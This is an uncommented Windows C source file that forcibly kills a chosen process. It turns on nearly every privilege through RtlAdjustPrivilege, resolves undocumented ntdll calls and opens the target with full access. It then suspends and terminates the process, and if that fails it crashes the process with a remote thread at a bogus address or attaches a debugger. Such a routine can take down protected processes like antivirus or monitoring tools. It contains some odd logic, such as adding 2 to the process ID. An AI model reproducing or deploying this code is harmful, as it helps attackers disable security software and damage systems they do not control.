#include <windows.h>

typedef DWORD (*pNtTerminateProcess)(HANDLE,UINT);
pNtTerminateProcess NtTerminateProcess;

typedef LONG (*pRtlAdjustPrivilege)(int,BOOL,BOOL,int*);
pRtlAdjustPrivilege RtlAdjPriv = NULL;

typedef LONG (*pZwWriteVirtualMemory) (HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferLength, PULONG ReturnLength);
pZwWriteVirtualMemory ZwWriteVirtualMemory = NULL;

typedef LONG (*pNtReadVirtualMemory) (HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesReaded OPTIONAL );
pNtReadVirtualMemory NtReadVirtualMemory = NULL;
typedef LONG (*pNtSuspendProcess )( HANDLE ProcessHandle );
typedef LONG (*pNtResumeProcess )( HANDLE ProcessHandle );
pNtSuspendProcess NtSuspendProcess = NULL;
pNtResumeProcess NtResumeProcess = NULL;

int AdjustPrivileges(int iName){
	int prtn;
	HMODULE ntdll = LoadLibrary("ntdll.dll");
	if(ntdll){
		RtlAdjPriv = (pRtlAdjustPrivilege) GetProcAddress(ntdll,"RtlAdjustPrivilege");
	}else{return 0;}
	if(RtlAdjPriv){
		RtlAdjPriv(iName,TRUE,FALSE,&prtn);
	}else{return 0;}
	FreeLibrary(ntdll);
	return 1;
}

int pTerminate (int ProcessId){
	int i = 2;
	HANDLE hProcess = NULL;
	HMODULE ntdll = NULL;
	ntdll = LoadLibrary( "ntdll.dll" );
	if (!ntdll){return 0;}
	
	for(;i <= 30;i++){
		AdjustPrivileges(i);
	}

	NtTerminateProcess = (pNtTerminateProcess)GetProcAddress( ntdll, "NtTerminateProcess");
	NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(ntdll, "NtReadVirtualMemory");
	ZwWriteVirtualMemory = (pZwWriteVirtualMemory)GetProcAddress(ntdll, "ZwWriteVirtualMemory");
	NtSuspendProcess = (pNtSuspendProcess)GetProcAddress(ntdll, "NtSuspendProcess" );
        NtResumeProcess = (pNtResumeProcess)GetProcAddress(ntdll, "NtResumeProcess" );

	FreeLibrary(ntdll);

	ProcessId += 2;
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessId);
	if(hProcess == NULL){return 0;}
	
	NtSuspendProcess(hProcess);
	if(NtTerminateProcess(hProcess, 1)){return 1;}
	if(CreateRemoteThread(hProcess,0,0,(DWORD (__stdcall *)(void *))100,0,0,0)){return 1;}
	if(DebugActiveProcess(ProcessId)){ExitProcess(1);}
	NtResumeProcess(hProcess);
	CloseHandle(hProcess);
	return 0;
}
